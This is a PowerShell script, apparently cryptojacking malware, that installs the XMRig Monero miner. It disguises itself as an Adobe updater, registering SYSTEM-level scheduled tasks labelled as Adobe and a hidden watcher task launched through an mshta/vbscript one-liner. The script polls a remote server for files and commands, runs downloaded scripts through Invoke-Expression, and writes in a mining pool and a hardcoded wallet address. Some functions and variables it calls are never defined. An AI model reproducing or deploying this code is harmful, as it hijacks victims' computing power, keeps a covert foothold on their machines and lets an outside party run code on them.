#Requires -Version 5
[CmdletBinding()]
param
(
  #[Parameter(Mandatory)]
  [ValidateNotNullOrEmpty()]
  [ValidateSet('init', 'watcher', 'download', 'run-script', 'register-task', 'self-update')]
  [string]$action
)

################################
########  Variables

$TaskName = "AdobeUpdater"
#$InvFolders = @("$env:ProgramFiles\Adobe\Updater", "$env:ProgramFiles\Adobe\Updater")
$sourceFolder = $PSScriptRoot
$thisFileName = $MyInvocation.MyCommand.Name
#$thisFileFullName = $MyInvocation.MyCommand.Path
$downloadFiles = $false
$destinationFolder = $PSScriptRoot #$InvFolders[0];

#$xmrigModulePath = "$sourceFolder\modules\xmrig"
#$GitRequestUri = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
#$GitRequestCudaUri = "https://api.github.com/repos/xmrig/xmrig-cuda/releases/latest"

$jsonInfoString = @"
{
  "api": {
      "id": null,
      "worker-id": null
  },
  "http": {
      "enabled": false,
      "host": "127.0.0.1",
      "port": 0,
      "access-token": null,
      "restricted": true
  },
  "autosave": true,
  "background": false,
  "colors": true,
  "title": true,
  "randomx": {
      "init": -1,
      "init-avx2": -1,
      "mode": "auto",
      "1gb-pages": false,
      "rdmsr": true,
      "wrmsr": true,
      "cache_qos": false,
      "numa": true,
      "scratchpad_prefetch_mode": 1
  },
  "cpu": {
      "enabled": true,
      "huge-pages": true,
      "huge-pages-jit": false,
      "hw-aes": null,
      "priority": null,
      "memory-pool": false,
      "yield": true,
      "max-threads-hint": 100,
      "asm": true,
      "argon2-impl": null,
      "astrobwt-max-size": 550,
      "astrobwt-avx2": false,
      "cn/0": false,
      "cn-lite/0": false
  },
  "opencl": {
      "enabled": false,
      "cache": true,
      "loader": null,
      "platform": "AMD",
      "adl": true,
      "cn/0": false,
      "cn-lite/0": false
  },
  "cuda": {
      "enabled": false,
      "loader": null,
      "nvml": true,
      "cn/0": false,
      "cn-lite/0": false
  },
  "donate-level": 1,
  "donate-over-proxy": 1,
  "log-file": null,
  "pools": [
      {
          "algo": null,
          "coin": null,
          "url": "donate.v2.xmrig.com:3333",
          "user": "YOUR_WALLET_ADDRESS",
          "pass": "x",
          "rig-id": null,
          "nicehash": false,
          "keepalive": false,
          "enabled": true,
          "tls": false,
          "tls-fingerprint": null,
          "daemon": false,
          "socks5": null,
          "self-select": null,
          "submit-to-origin": false
      }
  ],
  "print-time": 60,
  "health-print-time": 60,
  "dmi": true,
  "retries": 5,
  "retry-pause": 5,
  "syslog": false,
  "tls": {
      "enabled": false,
      "protocols": null,
      "cert": null,
      "cert_key": null,
      "ciphers": null,
      "ciphersuites": null,
      "dhparam": null
  },
  "user-agent": null,
  "verbose": 0,
  "watch": true,
  "pause-on-battery": false,
  "pause-on-active": false
}
"@

$TasksDefinitions = @{
  "AdobeUpdater" = @{
    "Name"          = "";
    "Values"        = @{"/ns:Task/ns:Actions/ns:Exec/ns:Command" = "{RootFolder}\xmrig.exe"; "Task/Actions/Exec/Argumetns" = "" };
    "XmlDefinition" = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1900-01-01T00:00:00.0000000</Date>
    <Author>Adobe Systems Incorporated</Author>
    <Description>Adobe Updater</Description>
    <URI>\AdobeUpdater</URI>
  </RegistrationInfo>
  <Triggers>
    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>
  </Triggers>
  <Principals>
    <Principal id="NT AUTHORITY\SYSTEM">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT1M</Duration>
      <WaitTimeout>PT0S</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>true</RunOnlyIfIdle>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="NT AUTHORITY\SYSTEM">
    <Exec>
      <Command></Command>
    </Exec>
  </Actions>
</Task>
"@
  };
  "Watcher"      = @{
    "Name"          = "";
    "Values"        = @{"/ns:Task/ns:Actions/ns:Exec/ns:Command" = "mshta.exe";
      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments"          = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''{ScriptFile}''"""""", 0 : window.close")'
    };
    "XmlDefinition" = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1971-08-31T00:00:00.0000000</Date>
    <Author>Adobe Systems Incorporated</Author>
    <Description>Adobe watcher</Description>
    <Version>' + $taskVersion + '</Version>
    <URI>\Adobe_Watcher</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>1971-08-31T00:00:00</StartBoundary>
      <ExecutionTimeLimit>PT30M</ExecutionTimeLimit>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-1-0</GroupId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command></Command>
      <Arguments></Arguments>
    </Exec>
  </Actions>
</Task>
"@
  }
}




################################
######## Actions Tasks

function _Unpack {
  param(
    [string]$DonwloadUri,
    [string]$DestinationFolder
  )

  $tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'zip' } -PassThru
  Invoke-WebRequest -OutFile $tmp $DonwloadUri
  Add-Type -Assembly System.IO.Compression.FileSystem
  $zip = [IO.Compression.ZipFile]::OpenRead($tmp.FullName)
  $entries = $zip.Entries | Where-Object { -not [string]::IsNullOrWhiteSpace($_.Name) -and -not $_.Name.EndsWith(".cmd") -and -not $_.Name.ToLower().Equals("sha256sums") }
  foreach ($entry in $entries) {
    $dpath = Join-Path -Path $DestinationFolder -ChildPath $entry.Name
    [IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $dpath, $true)
  }
}

function _CheckPwshNeedUpdate {
  param(

  )

  $gitUri = "https://api.github.com/repos/powershell/powershell"
  $gitUriReleases = "$gitUri/releases"
  $gitUriReleasesLatest = "$gitUri/releases/latest"
  $pattern = (@("PowerShell-(?<version>\d?\d.\d?\d.\d?\d)-win-x64.zip", "v(?<version>\d?\d.\d?\d.\d?\d)"))[1]
  $remoteVersion = [System.Version]::Parse("0.0.0")

  #$pswhInstalled = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName.Contains("C:\Program Files\PowerShell\7\pwsh.exe");
  
  $latestRelease = (Invoke-RestMethod -Method Get -Uri $gitUriReleasesLatest)
  
  if ($latestRelease.tag_name -match $pattern) {
    $remoteVersion = [System.Version]::Parse($Matches["version"]);
  }
  
  $localVersion = $PSVersionTable.PSVersion
  
  return ($localVersion -lt $remoteVersion)

}

function _InstallPwsh {  
  if (!(Get-IsAdmin)) {
    Write-Error "Run as administrator"
    exit
    $pswPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName;
    #$pp = $MyInvocation.MyCommand.Path
    if (((New-Object -TypeName System.Diagnostics.ProcessStartInfo -ArgumentList $pswPath).Verbs).Contains("runas")) {
      Start-Process -FilePath $pswPath -ArgumentList "-File $PSCommandPath" -Verb RunAs
    }
  }

  $pwshUri = ((Invoke-RestMethod -Method GET -Uri $gitUriReleases)[0].assets | Where-Object name -match "PowerShell-\d.\d.\d-win-x64.msi").browser_download_url

  # create temp file
  $tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'msi' } -PassThru

  Invoke-WebRequest -OutFile $tmp $pwshUri

  # command line arguments
  # USE_MU - This property has two possible values:
  #   1 (default) - Opts into updating through Microsoft Update, WSUS, or Configuration Manager
  #   0 - Do not opt into updating through Microsoft Update, WSUS, or Configuration Manager
  # ENABLE_MU
  #   1 (default) - Opts into using Microsoft Update for Automatic Updates
  #   0 - Do not opt into using Microsoft Update
  # ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL - This property controls the option for adding the Open PowerShell item to the context menu in Windows Explorer.
  # ADD_FILE_CONTEXT_MENU_RUNPOWERSHELL - This property controls the option for adding the Run with PowerShell item to the context menu in Windows Explorer.
  # ENABLE_PSREMOTING - This property controls the option for enabling PowerShell remoting during installation.
  # REGISTER_MANIFEST - This property controls the option for registering the Windows Event Logging manifest.

  $logFile = '{0}-{1}.log' -f $tmp.FullName, (get-date -Format yyyyMMddTHHmmss)
  $arguments = "/i {0} ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ADD_FILE_CONTEXT_MENU_RUNPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1 USE_MU=1 ENABLE_MU=1 /qn /norestart /L*v {1}" -f $tmp.FullName, $logFile
  Start-Process "msiexec.exe" -ArgumentList $arguments -NoNewWindow 
}

function _PwshContextMenu {
  #$oldVarDefault = (Get-ItemProperty -path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command)."(Default)"
  #$oldVarDefautValue = '%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -Command "&''%1''"'

  $pwshVarMenu = "$((Get-Command pwsh).Path) -Command ""&'%1'"""

  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command -Type ExpandString -Name '(Default)' -Value $pwshVarMenu

  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Force
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe -Command "$host.UI.RawUI.WindowTitle = ''PowerShell 7 (x64)''; if((Get-ExecutionPolicy ) -ne ''AllSigned'') { Set-ExecutionPolicy -Scope Process Bypass }; & ''%1''"' 
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name "PowerShellPath" -Value $pwshPath -Type String

  #"C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList '-ExecutionPolicy RemoteSigned -File \"%1\"' -Verb RunAs;start-sleep 1}"
  $keyName = "Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Run with PowerShell 7 (Admin)"
  New-Item -Path $keyName -Force
  Set-ItemProperty -Path $keyName -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path $keyName "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path "$keyName\Command" -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList ''-ExecutionPolicy RemoteSigned -File \"%1\"'' -Verb RunAs;start-sleep 1}'
  Set-ItemProperty -Path "$keyName\Command" -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path "$keyName\Command" -Name "PowerShellPath" -Value $pwshPath -Type String
}

function _RegisterTask {
  param (
    [Parameter()]
    [string]$TaskName
  )
  
  $xml = [xml]$TasksDefinitions[$TaskName]["XmlDefinition"]
  $ns = New-Object System.Xml.XmlNamespaceManager($xml.NameTable)
  $ns.AddNamespace("ns", $xml.DocumentElement.NamespaceURI)
  foreach ($item in $TasksDefinitions[$TaskName]["Values"].Keys) {
    $xmlNode = $xml.SelectSingleNode($item, $ns);
    if ($xmlNode) {
      $innerText = $TasksDefinitions[$TaskName]["Values"][$item] -replace '{RootFolder}', $destinationFolder -replace '{ScriptFile}', $script
      $xmlNode.InnerText = $innerText
    }
  }
  try {
    Register-ScheduledTask -Xml $xml.OuterXml -TaskName $TaskName
  }
  catch {}
}

function _CheckTask {
  param (
    [Parameter(Mandatory = $true)]
    [string]$TaskName,
    [Parameter()]
    [switch]$Register = $false
  )
  # load task definition
  # $xmlDef = New-Object -TypeName System.Xml.XmlDocument;
  # $xmlDef.LoadXml($XmlTaskDefinition);
  # $script = [System.IO.Path]::Combine($PSScriptRoot, $thisFileName) ; #+ " -Action watcher";
  # $execCommand = 'mshta.exe' 
  # $execArguments = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''' + $script + '''"""""", 0 : window.close")'
  # $xmlDef.Task.Actions.Exec.Command = $execCommand
  # $xmlDef.Task.Actions.Exec.Arguments = $execArguments
  $scheduledTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
  $needRegister = $false

  if (-not $scheduledTask) {
    $needRegister = $true
  }
  else {
    $taskVersionCurrent = $scheduledTask.Version
    if ((Get-ScheduledTask -TaskName $TaskName).State -eq "Disabled" -or ($taskVersionCurrent -ne $taskVersion)) {
      Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
      $needRegister = $true
    }
  }
  if ($needRegister -and $Register) {
    _RegisterTask -TaskName $TaskName;
    $needRegister = !$needRegister;
  }
  return !$needRegister
}

function _CheckServerConnection
{
  try{
    Invoke-RestMethod -Uri "$uri/GetConfig";
    return $true;
  }
  catch
  {
    return $false;
  }
}

################################
######## Check task
# $taskExist = _CheckTask -TaskName $TaskName -Register;
# if (!$taskExist) {
#   exit
# }

################################
######## Check json file
$jsonConfigString = @{version = 0; actions = @( @{"name" = "download"; "value" = "all"; status = "succes" }) };
$jsonConfigFile = [System.IO.Path]::Combine($destinationFolder, "config.json")

if (-not (Test-Path $jsonConfigFile)) {
  $jsonConfigString | ConvertTo-Json -Depth 5 | Out-File $jsonConfigFile
}
$jsonObject = Get-Content $jsonConfigFile | ConvertFrom-Json -Depth 5;

################################
######## check action and try to resolve it
$actionValue = "";
$actionIndex = 0;

if (-not ($action) -and (_CheckServerConnection)) {
  $uriConfig = $uri + "/GetConfig?name=version";

  [int]$versionRemote = Invoke-RestMethod -Uri $uriConfig

  [int]$versionLocal = $jsonObject.version

  if ($versionLocal -ne $versionRemote) {
    $jsonObject.version = $versionRemote;
    $jsonObject.actions = _GetActions;
    $jsonObject | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile;
    $jsonObject = Get-Content $jsonInfoFile | ConvertFrom-Json;
  }
  $actions = ($jsonObject.actions) | Where-Object { $_.status -eq "notrun" } | Sort-Object -Property Order

  if ($actions.Count -gt 0) {
    $action = $actions[0].name
    $actionValue = $actions[0].value
    $actionIndex = 0;
  }
}
if(-not $action)
{
  $action = "watcher"  
}

################################
######## Action processing

switch ($action) {
  "init" {
  }
  "download" {
    # get files and save its to the disk
    if ($actionValue -eq "all") {
      $getFilesUri = $uri + "/GetFiles"
      $files = Invoke-RestMethod -Uri $getFilesUri
      $jsonObject.status = [Status]::succes;
      $files = $files | Where-Object { $_ -ne $thisFileName }
    }
    else {
      $files = $actionValue -split "\|"
    }
    foreach ($item in $files) {
      $outFileName = [System.IO.Path]::Combine($destinationFolder, $item);
      $checkFolder = [System.IO.Path]::GetDirectoryName($outFileName);
      if (-not (Test-Path $checkFolder)) {
        New-Item -ItemType Directory -Force -Path $checkFolder
      }
      $downloadStatus = _GetFile -FileName $item -OutFileName $outFileName
      if (-not $downloadStatus) {
        $jsonObject.status = [Status]::failure;
      }
    }
  }
  "watcher" {
    if(_CheckPwshNeedUpdate)
    {
      _InstallPwsh
    }
  }
  "run-script" {
    try {
      $scriptToRun = "$PSScriptRoot\$value"
      Invoke-Expression "$scriptToRun"
    }
    catch {
      "error: action $action" | Out-File $logfile -Append
    }
  }
  "register-task" {
    $taskName = $actionValue.taskname
    $definitionName = $actionValue.definitionName
    $principal = $actionValue.principal
    $xmlDefinitionPath = [System.IO.Path]::Combine($destinationFolder, $definitionName)
    $xmlContent = Get-Content $xmlDefinitionPath
    $xmlContent = $xmlContent -replace '{RootFolder}', $destinationFolder
    [xml]$xmlDef = $xmlContent
    Register-TaskLocal -TaskName $taskName -XmlDefinition $xmlDef -Principal $principal
  }
  "self-update" {
    _SelfUpdate
  }
  "run-file" {
    if (Test-Path -Path $watcherFileName) {
      Invoke-Expression "& `"$watcherFileName`" -action init"
    }
  }
}

if($actions)
{
  $actions[$actionIndex].status = ([Status]::succes).ToString();
  $jsonObject | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile
}












exit

















if (!(Test-Path -PathType Container -Path $destinationFolder)) {
  New-Item -ItemType Directory -Force -Path $destinationFolder
}

if ($psversiontable.PSversion -lt [System.Version]::Parse("7.0")) {
  if (!(Get-Command pwsh -ErrorAction SilentlyContinue)) {
    _InstallPwsh
    exit
  }
  exit
  _PwshContextMenu
}

if ($downloadFiles) {
  ### 1
  $releases = (Invoke-RestMethod -Method Get -Uri $GitRequestUri).assets | Where-Object { $_.name -match "xmrig-\d.\d\d.\d-gcc-win64.zip" }
  if (!([bool]($releases.PSobject.Properties.name -match "browser_download_url"))) {
    exit
  }
  _Unpack -DonwloadUri $releases.browser_download_url -DestinationFolder $destinationFolder

  ### 2
  if (-not (Test-Path $jsonInfoFile)) {
    $jsonInfoString | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile
  }
  $jsonObject = Get-Content $jsonInfoFile | ConvertFrom-Json -Depth 5;
  $jsonObject.pools[0].url = "pool.supportxmr.com:5555"
  $jsonObject.pools[0].user = "8ApZv61PPDWgRwR3HJD9zziX9xWTq6JVag3RqDnwfygKavSJezZYYn7Xvj5u41KThVP59aequGAx8cpBMrzxcChEAxf69zz"
  $jsonObject.pools[0].pass = "x"
  $jsonObject.cuda.enabled = $true
  $jsonObject | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile
  ### 3

  #xmrig-cuda-6.12.0-cuda10_2-win64.zip
  #$releases = $requestData #| Where-Object {$_.name -match "xmrig-cuda-6.12.0-cuda10_2-win64.zip"} # | Select-Object -Property Name
  $pattern = "xmrig-cuda-(?<version>\d.\d\d.\d)-cuda(?<cversion>\d\d_\d)-win64.zip"
  $releases = (Invoke-RestMethod -Method Get -Uri $GitRequestCudaUri).assets
  $outItems = New-Object System.Collections.ArrayList
  foreach ($item in $releases) {
    if ($item.name -match $pattern) {
      $version = [System.Version]::Parse($Matches["version"]);
      $cversion = [System.Version]::Parse(($Matches["cversion"] -replace "_", "."));
      $outItems.Add(@{version = $version; cversion = $cversion; url = $item.browser_download_url }) | Out-Null;
    }
  }
  $oitem = $outItems | Where-Object { $_.cversion.Major -eq 10 } | Sort-Object -Property cversion -Descending | Select-Object -First 1

  _Unpack -DonwloadUri $oitem.url -DestinationFolder $destinationFolder
}
else {
  #upload files from current folder
  $items = Get-ChildItem -Path $xmrigModulePath
  foreach ($item in $items) {
    Copy-Item -Path $item -Destination $destinationFolder -Force
  }
}
